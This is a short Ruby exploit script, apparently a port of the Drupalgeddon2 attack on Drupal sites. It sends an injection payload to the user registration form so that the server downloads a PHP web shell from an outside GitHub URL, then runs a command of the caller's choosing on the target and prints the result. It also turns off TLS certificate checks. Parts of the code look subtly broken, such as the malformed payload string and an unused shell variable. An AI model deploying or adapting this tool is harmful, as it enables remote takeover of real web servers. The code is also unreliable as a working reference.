require 'net/http'

# Hans Topo ruby port from Drupalggedon2 exploit.
# Based on Vitalii Rudnykh exploit

target = ARGV[0]
command = ARGV[1]

url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'

shell = "<?php system($_GET['cmd']); ?>"

payload = "{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/sh.php}"

uri = URI(url)

http = Net::HTTP.new(uri.host,uri.port)

if uri.scheme == 'https'
	http.use_ssl = true
	http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end

req = Net::HTTP::Post.new(uri.path)
req.body = payload

response = http.request(req)

if response.code != "200"
	puts "[*] Response: " + response.code
	puts "[*] Target seems not to be exploitable"
	exit
end

puts "[*] Target seems to be exploitable."

exploit_uri = URI(target+"sh.php?cmd=#{command}")
response = Net::HTTP.get_response(exploit_uri)
puts response.body





